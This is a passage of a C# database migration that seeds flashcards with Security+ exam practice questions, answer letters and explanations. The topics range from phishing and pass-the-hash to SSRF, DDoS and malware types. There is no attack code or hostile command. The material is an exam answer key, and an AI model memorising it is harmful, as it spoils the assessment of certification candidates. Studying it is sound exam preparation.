                values: new object[] { 189, "\r\n189. C. The reconnaissance phase of a penetration test involves\r\ngathering information about the target, including domain\r\ninformation, system information, and details about employees\r\nlike phone numbers, names, and email addresses.\r\n", 1, "\r\n189. During what phase of a penetration test is information like employee names, phone number,\r\nand email addresses gathered?\r\nA. Exploitation\r\nB. Establishing persistence\r\nC. Reconnaissance\r\nD. Lateral movement\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 190, "\r\n190. A. Angela has impersonated an actual employee of the delivery\r\nservice to gain access to the company. Company uniforms are a\r\nvery useful element for in-person social engineering. Whaling is\r\na type of phishing attack aimed at leaders in an organization. A\r\nwatering hole attack deploys malware or other attack tools at a\r\nsite or sites that a target group frequently uses. Prepending is\r\nvaguely defined by the Security+ exam but can mean a number\r\nof things. When you see prepending on the exam, it should\r\nnormally mean “adding something to the front of text.”\r\n", 1, "\r\n190. During a penetration test, Angela obtains the uniform of a well-known package delivery service\r\nand wears it into the target office. She claims to have a delivery for a C-level employee\r\nshe knows is there and insists that the package must be signed for by that person. What\r\nsocial engineering technique has she used?\r\nA. Impersonation\r\nB. Whaling\r\nC. A watering hole attack\r\nD. Prepending\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 191, "\r\n191. D. Acquisition via the gray market can lead to lack of vendor\r\nsupport, lack of warranty coverage, and the inability to validate\r\nwhere the devices came from. Nick should express concerns\r\nabout the supply chain, and if his devices need to be from a\r\ntrusted source or supplier with real support he may need to\r\nchange his organization’s acquisition practices.\r\n", 1, "\r\n191. Nick purchases his network devices through a gray market supplier that imports them into\r\nhis region without an official relationship with the network device manufacturer. What risk\r\nshould Nick identify when he assesses his supply chain risk?\r\nA. Lack of vendor support\r\nB. Lack of warranty coverage\r\nC. Inability to validate the source of the devices\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 192, "\r\n192. B. XML injection is often done by modifying HTTP queries sent\r\nto an XML-based web service. Reviewing web server logs to see\r\nwhat was sent and analyzing them for potential attacks will help\r\nChristina see if unexpected user input is visible in the logs.\r\nSyslog, authentication logs, and event logs are unlikely to\r\ncontain information about web applications that would show\r\nevidence of an XML injection–based attack.\r\nUse the following scenario for questions 193–195.\r\nFrank is the primary IT staff member for a small company and\r\nhas migrated his company’s infrastructure from an on-site\r\ndatacenter to a cloud-based infrastructure as a service (IaaS)\r\nprovider. Recently he has been receiving reports that his website\r\nis slow to respond and that it is inaccessible at times. Frank\r\nbelieves that attackers may be conducting a denial-of-service\r\nattack against his organization.\r\n", 1, "\r\n192. Christina wants to identify indicators of attack for XML-based web applications that her\r\norganization runs. Where is she most likely to find information that can help her determine\r\nwhether XML injection is occurring against her web applications?\r\nA. Syslog\r\nB. Web server logs\r\nC. Authentication logs\r\nD. Event logs\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 193, "\r\n193. C. Frank’s best option is to review the anti-denial-of-service\r\nand other security tools that his cloud hosting provider provides,\r\nand to make appropriate use of them. The major infrastructure\r\nas a service (IaaS) providers have a variety of security tools that\r\ncan help both detect and prevent DoS attacks from taking down\r\nsites that are hosted in their infrastructure. Calling the cloud\r\nservice provider’s ISP will not work because the ISP works with\r\nthe cloud provider, not with Frank! It is possible the cloud\r\nservice provider might be able to assist Frank, but they are most\r\nlikely to instruct him to use the existing tools that they already\r\nprovide.\r\n", 1, "\r\n193. What can Frank do to determine if he is suffering from a denial-of-service (DoS) attack\r\nagainst his cloud hosting environment?\r\nA. Nothing; cloud services do not provide security tools.\r\nB. Call the cloud service provider to have them stop the DoS attack.\r\nC. Review the cloud service provider’s security tools and enable logging and anti-DoS\r\ntools if they exist.\r\nD. Call the cloud service provider’s Internet service provider (ISP) and ask them to enable\r\nDoS prevention.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 194, "\r\n194. C. Since Frank is using the cloud service provider’s web\r\nservices, he will need to review the logs that they capture. If he\r\nhas not configured them, he will need to do so, and he will then\r\nneed a service or capability to analyze them for the types of\r\ntraffic he is concerned about. Syslog and Apache logs are both\r\nfound on a traditional web host, and they would be appropriate\r\nif Frank was running his own web servers in the infrastructure\r\nas a service (IaaS) environment.\r\n", 1, "\r\n194. Frank is using the cloud hosting service’s web publishing service rather than running his\r\nown web servers. Where will Frank need to look to review his logs to see what types of\r\ntraffic his application is creating?\r\nA. Syslog\r\nB. Apache logs\r\nC. The cloud service’s web logs\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 195, "\r\n195. B. The most useful data is likely to come from an IPS, or\r\nintrusion prevention system. He will be able to determine if the\r\nattack is a denial-of-service (DoS) attack, and the IPS may be\r\nable to help him determine the source of the denial-of-service\r\nattack. A firewall might provide some useful information but\r\nwould only show whether or not traffic was allowed and would\r\nnot analyze the traffic for attack information. A vulnerability\r\nscanner would indicate if there was an issue with his application\r\nor the server, but it would not identify this type of attack.\r\nAntimalware software can help find malware on the system but\r\nisn’t effective against a DoS attack.\r\n", 1, "\r\n195. If Frank were still operating in his on-site infrastructure, which of the following\r\ntechnologies would provide the most insight into what type of attack he was seeing?\r\nA. A firewall\r\nB. An IPS\r\nC. A vulnerability scanner\r\nD. Antimalware software\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 114, "\r\n114. D. Using a pass-the-hash attack requires attackers to acquire a\r\nlegitimate hash, and then present it to a server or service. A real\r\nhash was provided; it was not spoofed. An evil twin is a wireless\r\nattack. Shimming is inserting malicious code between an\r\napplication and a library.\r\n", 1, "\r\n114. You are responsible for incident response at Acme Corporation. You have discovered that\r\nsomeone has been able to circumvent the Windows authentication process for a specific network\r\napplication. It appears that the attacker took the stored hash of the password and sent\r\nit directly to the backend authentication service, bypassing the application. What type of\r\nattack is this?\r\nA. Hash spoofing\r\nB. Evil twin\r\nC. Shimming\r\nD. Pass the hash\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 224, "\r\n7. C. Windows picture passwords require you to click on specific\r\nlocations on a picture. This is an example of a something-youcan-\r\ndo factor. Geolocation or a network location are examples of\r\nsomewhere you are, whereas something you exhibit is often a\r\npersonality trait, and someone you know is exactly what it\r\nsounds like: someone who can identify you as an individual.\r\n", 2, "\r\n7. What type of attribute is a Windows picture password?\r\nA. Somewhere you are\r\nB. Something you exhibit\r\nC. Something you can do\r\nD. Someone you know\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 113, "\r\n113. B. Malicious tools like BadUSB can make a USB cable or drive\r\nlook like a keyboard when they are plugged in. Somewhat\r\nstrangely, the Security+ exam outline focuses on malicious USB\r\ncables, but you should be aware that malicious thumb drives are\r\nfar more common and have been used by penetration testers\r\nsimply by dropping them in a parking lot near their intended\r\ntarget. A Trojan or a worm is a possibility, but the clue involving\r\nthe keyboard would point to a USB device as the first place\r\nNaomi should look.\r\n", 1, "\r\n113. During an incident investigation, Naomi notices that a second keyboard was plugged into a\r\nsystem in a public area of her company’s building. Shortly after that event, the system was\r\ninfected with malware, resulting in a data breach. What should Naomi look for in her inperson\r\ninvestigation?\r\nA. A Trojan horse download\r\nB. A malicious USB cable or drive\r\nC. A worm\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 111, "\r\n111. B. Tailgating involves simply following a legitimate user\r\nthrough the door once they have opened it, and it is a common\r\nmeans of exploiting a smartcard-based entry access system. It is\r\nsimpler and usually easier than attempting to capture and clone\r\na card. Phishing is unrelated to physical security. Although it is\r\npossible to generate a fake smartcard, it is a very uncommon\r\nattack. RFID spoofing can be accomplished but requires access\r\nto a valid RFID card and is relatively uncommon as well.\r\n", 1, "\r\n111. John is responsible for physical security at a large manufacturing plant. Employees all use a\r\nsmartcard in order to open the front door and enter the facility. Which of the following is a\r\ncommon way attackers would circumvent this system?\r\nA. Phishing\r\nB. Tailgating\r\nC. Spoofing the smartcard\r\nD. RFID spoofing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 30, "\r\n30. A. Server-side request forgery (SSRF) attempts typically\r\nattempt to get HTTP data passed through and will not include\r\nSQL injection. Blocking sensitive hostnames, IP addresses, and\r\nURLs are all valid ways to prevent SSRF, as is the use of\r\nwhitelist-based input filters.\r\n", 1, "\r\n30. Alice wants to prevent SSRF attacks. Which of the following will not be helpful for preventing\r\nthem?\r\nA. Removing all SQL code from submitted HTTP queries\r\nB. Blocking hostnames like 127.0.01 and localhost\r\nC. Blocking sensitive URLs like /admin\r\nD. Applying whitelist-based input filters\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 31, "\r\n31. A. Domain Name System (DNS) poisoning attacks attempt to\r\ninsert incorrect or malicious entries into a trusted DNS server.\r\nAddress Resolution Protocol (ARP) poisoning involves altering\r\nthe MAC-IP tables in a switch. Although cross-site scripting\r\n(XSS) and cross-site request forgery (CSRF or XSRF) are both\r\ntypes of attacks, neither is a poisoning attack.\r\n", 1, "\r\n31. What type of attack is based on entering fake entries into a target network’s domain\r\nname server?\r\nA. DNS poisoning\r\nB. ARP poisoning\r\nC. XSS poisoning\r\nD. CSRF poisoning\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 32, "\r\n32. C. An unknown environment test is also called black-box or a\r\nzero-knowledge test because it does not provide information\r\nbeyond the basic information needed to identify the target. A\r\nknown environment, or white-box test, involves very complete\r\ninformation being given to the tester. This scenario is probably\r\ndone from outside the network, but external test is not the\r\ncorrect terminology. Threat test is not a term used in\r\npenetration testing.\r\n", 1, "\r\n32. Frank has been asked to conduct a penetration test of a small bookkeeping firm. For the test,\r\nhe has only been given the company name, the domain name for their website, and the IP\r\naddress of their gateway router. What best describes this type of test?\r\nA. A known environment test\r\nB. External test\r\nC. An unknown environment test\r\nD. Threat test\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 33, "\r\n33. D. A pivot occurs when you exploit one machine and use that as\r\na basis to attack other systems. Pivoting can be done from\r\ninternal or external tests. White- and black-box testing describes\r\nthe amount of information the tester is given in advance, not\r\nhow the tester performs the test.\r\n", 1, "\r\n33. You work for a security company that performs penetration testing for clients. You are conducting\r\na test of an e-commerce company. You discover that after compromising the web\r\nserver, you can use the web server to launch a second attack into the company’s internal network.\r\nWhat best describes this?\r\nA. Internal attack\r\nB. Known environment testing\r\nC. Unknown environment testing\r\nD. A pivot\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 34, "\r\n34. A. Shimming is when the attacker places some malware\r\nbetween an application and some other file and intercepts the\r\ncommunication to that file (usually to a library or system API).\r\nIn many cases, this is done with a driver for a hardware\r\ncomponent. A Trojan horse might be used to get the shim onto\r\nthe system, but that is not described in this scenario. A backdoor\r\nis a means to circumvent system authorization and get direct\r\naccess to the system. Refactoring is the process of changing\r\nnames of variables, functions, and so forth in a program.\r\n", 1, "\r\n34. While investigating a malware outbreak on your company network, you discover something\r\nvery odd. There is a file that has the same name as a Windows system DLL, and it even has\r\nthe same API interface, but it handles input very differently, in a manner to help compromise\r\nthe system, and it appears that applications have been attaching to this file, rather than the\r\nreal system DLL. What best describes this?\r\nA. Shimming\r\nB. Trojan horse\r\nC. Backdoor\r\nD. Refactoring\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 35, "\r\n35. C. SOAR is a relatively new category as defined by Gartner.\r\nSecurity orchestration, automation, and response includes\r\nthreat and vulnerability management, security incident\r\nresponse, and security operations automation, but not\r\nautomated malware analysis.\r\n", 1, "\r\n35. Which of the following capabilities is not a key part of a SOAR (security orchestration, automation,\r\nand response) tool?\r\nA. Threat and vulnerability management\r\nB. Security incident response\r\nC. Automated malware analysis\r\nD. Security operations automation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 36, "\r\n36. C. Domain reputation services like Reputation Authority,\r\nCisco’s Talos, McAfee’s trustedsource.org, and Barracuda’s\r\nbarracudacentral.org sites all provide domain reputation data\r\nthat allow you to look up a domain or IP address to determine if\r\nit is currently blacklisted or has a poor reputation.\r\n", 1, "\r\n36. John discovers that email from his company’s email servers is being blocked because of spam\r\nthat was sent from a compromised account. What type of lookup can he use to determine\r\nwhat vendors like McAfee and Barracuda have classified his domain as?\r\nA. An nslookup\r\nB. A tcpdump\r\nC. A domain reputation lookup\r\nD. A SMTP whois\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 37, "\r\n37. B. His machines are part of a distributed denial-of-service\r\n(DDoS) attack. This scenario describes a generic DDoS, not a\r\nspecific one like SYN flood, which would involve many SYN\r\npackets being sent without a full three-way TCP handshake.\r\nThese machines could be part of a botnet or they may just have a\r\ntrigger that causes them to launch the attack at a specific time.\r\nThe real key in this scenario is the DDoS attack. Finally, a\r\nbackdoor gives an attacker access to the target system.\r\n", 1, "\r\n37. Frank is a network administrator for a small college. He discovers that several machines\r\non his network are infected with malware. That malware is sending a flood of packets to a\r\ntarget external to the network. What best describes this attack?\r\nA. SYN flood\r\nB. DDoS\r\nC. Botnet\r\nD. Backdoor\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 38, "\r\n38. B. Since open Wi-Fi hotspots do not have a way to prove they\r\nare legitimate, they can be easily spoofed. Attackers can stand\r\nup a fake version of the hotspot and then conduct an SSL\r\nstripping attack by inserting themselves into sessions that\r\nvictims attempt to open to secure servers.\r\n", 1, "\r\n38. Why is SSL stripping a particular danger with open Wi-Fi networks?\r\nA. WPA2 is not secure enough to prevent this.\r\nB. Open hotspots do not assert their identity in a secure way.\r\nC. Open hotspots can be accessed by any user.\r\nD. 802.11ac is insecure and traffic can be redirected.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 39, "\r\n39. B. A Trojan horse attaches a malicious program to a legitimate\r\nprogram. When the user downloads and installs the legitimate\r\nprogram, they get the malware. A logic bomb is malware that\r\ndoes its misdeeds when some condition is met. A rootkit is\r\nmalware that gets administrative, or root, access. A macro virus\r\nis a virus that is embedded in a document as a macro.\r\n", 1, "\r\n39. A sales manager at your company is complaining about slow performance on his computer.\r\nWhen you thoroughly investigate the issue, you find spyware on his computer. He insists that\r\nthe only thing he has downloaded recently was a freeware stock trading application. What\r\nwould best explain this situation?\r\nA. Logic bomb\r\nB. Trojan horse\r\nC. Rootkit\r\nD. Macro virus\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 40, "\r\n40. D. Whaling is targeting a specific individual who is important\r\nin the organization like the president or chief financial officer\r\n(CFO). Spear phishing targets specific individuals or groups, but\r\nwhaling is more specific in terms of the importance of the\r\nindividuals involved. Targeted phishing is not a term used in the\r\nindustry. Phishing is the generic term for a wide range of related\r\nattacks, and you should choose the most accurate answer for\r\nquestions like this.\r\n", 1, "\r\n40. When phishing attacks are so focused that they target a specific high-ranking or important\r\nindividual, they are called what?\r\nA. Spear phishing\r\nB. Targeted phishing\r\nC. Phishing\r\nD. Whaling\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 29, "\r\n29. B. Passive reconnaissance is any reconnaissance that is done\r\nwithout actually connecting to the target. In this case, John is\r\nconducting a form of OSINT, or open source intelligence, by\r\nusing commonly available third-party information sources to\r\ngather information about his target. Active reconnaissance\r\ninvolves communicating with the target network, such as doing\r\na port scan. The initial exploitation is not information gathering;\r\nit is actually breaking into the target network. A pivot is when\r\nyou have breached one system and use that to move to another\r\nsystem.\r\n", 1, "\r\n29. John is conducting a penetration test of a client’s network. He is currently gathering\r\ninformation from sources such as archive.org, netcraft.com, social media, and\r\ninformation websites. What best describes this stage?\r\nA. Active reconnaissance\r\nB. Passive reconnaissance\r\nC. Initial exploitation\r\nD. Pivot\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 41, "\r\n41. D. Criminal syndicates may produce, sell, and support malware\r\ntools, or may deploy them themselves. Crypto malware and\r\nother packages are examples of tools often created and used by\r\ncriminal syndicates. State actors are more likely to be associated\r\nwith advanced persistent threats (APTs) aimed at accomplishing\r\ngoals of the nation-state that supports them. Hacktivists\r\ntypically have political motivations, whereas script kiddies may\r\nsimply be in it for recognition or fun.\r\n", 1, "\r\n41. What type of threat actors are most likely to have a profit motive for their malicious\r\nactivities?\r\nA. State actors\r\nB. Script kiddies\r\nC. Hacktivists\r\nD. Criminal syndicates\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 43, "\r\n43. B. The most common concern that will arise when a vendor no\r\nlonger supports a device is a lack of updates or patches. This is\r\nparticularly concerning when the devices are operational\r\ntechnology such as utility, lighting, or other infrastructure\r\ncontrol devices that have a very long life cycle and control\r\nimportant processes or systems. Although improper data\r\nstorage, lack of documentation, and configuration issues can all\r\nbe issues, lack of updates and patching remains the biggest and\r\nmost frequent issue.\r\n", 1, "\r\n43. What risk is commonly associated with a lack of vendor support for a product, such as an\r\noutdated version of a device?\r\nA. Improper data storage\r\nB. Lack of patches or updates\r\nC. Lack of available documentation\r\nD. System integration and configuration issues\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 44, "\r\n44. A. Bluejacking involves sending unsolicited messages to\r\nBluetooth devices when they are in range. Bluesnarfing involves\r\ngetting data from the Bluetooth device. An evil twin attack uses a\r\nrogue access point whose name is similar or identical to that of a\r\nlegitimate access point.\r\n", 1, "\r\n44. You have noticed that when in a crowded area, you sometimes get a stream of unwanted text\r\nmessages. The messages end when you leave the area. What describes this attack?\r\nA. Bluejacking\r\nB. Bluesnarfing\r\nC. Evil twin\r\nD. Rogue access point\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 45, "\r\n45. A. Since Dennis is able to view the web traffic before it is sent\r\nto the actual server, he should be able to conduct a plain-text\r\npassword attack by intercepting the password. Pass-the-hash\r\nattacks are typically used inside Windows environments, SQL\r\ninjection would attack the server, and cross-site scripting is\r\npossible but not as likely as the plain-text password attack in\r\nthis scenario.\r\n", 1, "\r\n45. Dennis uses an on-path attack to cause a system to send HTTPS traffic to his system and\r\nthen forwards it to the actual server the traffic is intended for. What type of password attack\r\ncan he conduct with the data he gathers if he captures all the traffic from a login form?\r\nA. A plain-text password attack\r\nB. A pass-the-hash attack\r\nC. A SQL injection attack\r\nD. A cross-site scripting attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 46, "\r\n46. A. Dumpster diving is the term for rummaging through the\r\nwaste/trash to recover useful documents or materials.\r\nPenetration testers and attackers may dumpster-dive as part of\r\ntheir efforts. In fact, emptying trash cans in a location can\r\nprovide useful information even without jumping into a\r\ndumpster! Trash diving and trash engineering are not the terms\r\nused in the industry. Nothing in this scenario describes social\r\nengineering.\r\n", 1, "\r\n46. Someone has been rummaging through your company’s trash bins seeking to find documents,\r\ndiagrams, or other sensitive information that has been thrown out. What is this called?\r\nA. Dumpster diving\r\nB. Trash diving\r\nC. Social engineering\r\nD. Trash engineering\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 47, "\r\n47. A. This is a remote-access Trojan (RAT), malware that opens\r\naccess for someone to remotely access the system. A worm\r\nwould have spread itself via a vulnerability, whereas a logic\r\nbomb runs when some logical condition is met. Finally, a rootkit\r\nprovides root or administrative access to the system.\r\n", 1, "\r\n47. Louis is investigating a malware incident on one of the computers on his network. He has\r\ndiscovered unknown software that seems to be opening a port, allowing someone to remotely\r\nconnect to the computer. This software seems to have been installed at the same time as a\r\nsmall shareware application. Which of the following best describes this malware?\r\nA. RAT\r\nB. Worm\r\nC. Logic bomb\r\nD. Rootkit\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 48, "\r\n48. B. Zero-day exploits are new, and they are not in the virus\r\ndefinitions for the antivirus (AV) programs. This makes them\r\ndifficult to detect, except by their behavior. RATs, worms, and\r\nrootkits are more likely to be detected by AV programs.\r\n", 1, "\r\n48. Jared is responsible for network security at his company. He has discovered behavior on one\r\ncomputer that certainly appears to be a virus. He has even identified a file he thinks might be\r\nthe virus. However, using three separate antivirus programs, he finds that none can detect the\r\nfile. Which of the following is most likely to be occurring?\r\nA. The computer has a RAT.\r\nB. The computer has a zero-day exploit.\r\nC. The computer has a worm.\r\nD. The computer has a rootkit.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 49, "\r\n49. D. Radio frequency identifier (RFID) attacks typically focus on\r\ndata capture, spoofing RFID data, or conducting a denial-ofservice\r\nattack. Birthday attacks are used against cryptosystems,\r\nwhich may be part of an RFID tag environment, but they aren’t a\r\ncommon attack against RFID systems.\r\n", 1, "\r\n49. Which of the following is not a common means of attacking RFID badges?\r\nA. Data capture\r\nB. Spoofing\r\nC. Denial-of-service\r\nD. Birthday attacks\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 50, "\r\n50. C. Initialization vectors are used with stream ciphers. An IV\r\nattack attempts to exploit a flaw to use the IV to expose\r\nencrypted data. Nothing in this scenario requires or describes a\r\nrogue access point/evil twin. Wi-Fi Protected Setup (WPS) uses\r\na PIN to connect to the wireless access point (WAP). The WPS\r\nattack attempts to intercept that PIN in transmission, connect to\r\nthe WAP, and then steal the WPA2 password.\r\n", 1, "\r\n50. Your wireless network has been breached. It appears the attacker modified a portion of data\r\nused with the stream cipher and used this to expose wirelessly encrypted data. What is this\r\nattack called?\r\nA. Evil twin\r\nB. Rogue WAP\r\nC. IV attack\r\nD. WPS attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 51, "\r\n51. C. This description does not include any risk to availability\r\nsince there is no information about systems or services being\r\ndown or offline. This scenario would likely result in reputational,\r\nfinancial, and data loss impacts for Scott’s company.\r\n", 1, "\r\n51. The company that Scott works for has experienced a data breach, and the personal\r\ninformation of thousands of customers has been exposed. Which of the following impact\r\ncategories is not a concern as described in this scenario?\r\nA. Financial\r\nB. Reputation\r\nC. Availability loss\r\nD. Data loss\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 52, "\r\n52. B. Cross-site request forgery (XSRF or CSRF) sends fake\r\nrequests to a website that purport to be from a trusted,\r\nauthenticated user. Cross-site scripting (XSS) exploits the trust\r\nthe user has for the website and embeds scripts into that\r\nwebsite. Bluejacking is a Bluetooth attack. Nothing in this\r\nscenario requires or describes an evil twin, which is an attack\r\nthat uses a malicious access point that duplicates a legitimate\r\nAP.\r\n", 1, "\r\n52. What type of attack exploits the trust that a website has for an authenticated user to attack\r\nthat website by spoofing requests from the trusted user?\r\nA. Cross-site scripting\r\nB. Cross-site request forgery\r\nC. Bluejacking\r\nD. Evil twin\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 53, "\r\n53. A. Cyberintelligence fusion is the process of gathering,\r\nanalyzing, and then distributing information between disparate\r\nagencies and organizations. Fusion centers like those operated\r\nby the U.S. Department of Homeland Security (DHS) focus on\r\nstrengthening shared intelligence activities. They are not\r\nspecifically tasked with building tools by combining other tools,\r\nalthough they may in some cases. They are not power plants,\r\nand they are focused on gathering and sharing information, not\r\nbuilding a classification structure.\r\n", 1, "\r\n53. What purpose does a fusion center serve in cyberintelligence activities?\r\nA. It promotes information sharing between agencies or organizations.\r\nB. It combines security technologies to create new, more powerful tools.\r\nC. It generates power for the local community in a secure way.\r\nD. It separates information by classification ratings to avoid accidental distribution.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 42, "\r\n42. A. A rainbow table is a table of precomputed hashes, used to\r\nretrieve passwords. A backdoor is used to gain access to a\r\nsystem, not to recover passwords. Social engineering and\r\ndictionary attacks can both be used to gain access to passwords,\r\nbut they are not tables of precomputed hashes.\r\n", 1, "\r\n42. One of your users cannot recall the password for their laptop. You want to recover that\r\npassword for them. You intend to use a tool/technique that is popular with hackers, and\r\nit consists of searching tables of precomputed hashes to recover the password. What best\r\ndescribes this?\r\nA. Rainbow table\r\nB. Backdoor\r\nC. Social engineering\r\nD. Dictionary attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 54, "\r\n54. B. The Common Vulnerabilities and Exposures (CVE) list has\r\nentries that describe and provide references to publicly known\r\ncybersecurity vulnerabilities. A CVE feed will provide updated\r\ninformation about new vulnerabilities and a useful index\r\nnumber to cross reference with other services.\r\n", 1, "\r\n54. CVE is an example of what type of feed?\r\nA. A threat intelligence feed\r\nB. A vulnerability feed\r\nC. A critical infrastructure listing feed\r\nD. A critical virtualization exploits feed\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 28, "\r\n28. B. Systems and software that no longer have vendor support\r\ncan be a significant security risk, and ensuring that a vendor will\r\ncontinue to exist and provide support is an important part of\r\nmany procurement processes. Selah’s questions are intended to\r\nassess the longevity and viability of the company and whether\r\nbuying from them will result in her organization having a usable\r\nproduct for the long term.\r\n", 1, "\r\n28. Selah includes a question in her procurement request-for-proposal process that asks how\r\nlong the vendor has been in business and how many existing clients the vendor has. What\r\ncommon issue is this practice intended to help prevent?\r\nA. Supply chain security issues\r\nB. Lack of vendor support\r\nC. Outsourced code development issues\r\nD. System integration problems\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 26, "\r\n26. B. Phishing is intended to acquire data, most often credentials\r\nor other information that will be useful to the attacker. Spam is a\r\nbroader term for unwanted email, although the term is often\r\ngenerally used to describe unwanted communications. Spear\r\nphishing targets specific individuals, whereas whaling targets\r\nimportant people in an organization. Smishing is sent via SMS\r\n(text message). Malware can be sent in any of these instances,\r\nbut there is not a specific related term that means “spam with\r\nmalware in it.”\r\n", 1, "\r\n26. How is phishing different from general spam?\r\nA. It is sent only to specific targeted individuals.\r\nB. It is intended to acquire credentials or other data.\r\nC. It is sent via SMS.\r\nD. It includes malware in the message.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 2, "\r\n2. B. A logic bomb is malware that performs its malicious activity\r\nwhen some condition is met. A worm is malware that selfpropagates.\r\nA Trojan horse is malware attached to a legitimate\r\nprogram, and a rootkit is malware that gets root or\r\nadministrative privileges.\r\n", 1, "\r\n2. You are a security administrator for a medium-sized bank. You have discovered a piece of\r\nsoftware on your bank’s database server that is not supposed to be there. It appears that the\r\nsoftware will begin deleting database files if a specific employee is terminated. What best\r\ndescribes this?\r\nA. Worm\r\nB. Logic bomb\r\nC. Trojan horse\r\nD. Rootkit\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
